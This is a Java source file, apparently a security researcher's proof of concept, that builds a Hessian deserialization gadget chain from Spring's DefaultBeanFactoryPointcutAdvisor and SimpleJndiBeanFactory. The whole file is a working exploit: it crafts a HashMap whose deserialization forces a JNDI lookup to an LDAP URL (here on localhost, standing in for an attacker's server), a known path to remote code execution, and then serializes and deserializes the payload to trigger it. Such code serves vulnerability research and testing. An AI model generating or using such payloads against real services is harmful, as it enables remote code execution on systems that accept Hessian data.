package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.*;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 11:34 下午
 */
public class SpringAbstractBeanFactoryPointcutAdvisorGadget {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        setFieldValue(bf, "logger", new NoOpLog());
        setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());

        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName(jndiUrl);

        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, pcadv, pcadv, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, new DefaultBeanFactoryPointcutAdvisor(), new DefaultBeanFactoryPointcutAdvisor(), null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian 序列化数据
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
        serializableFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializableFactory);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));

        // Hessian 反序列化数据
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}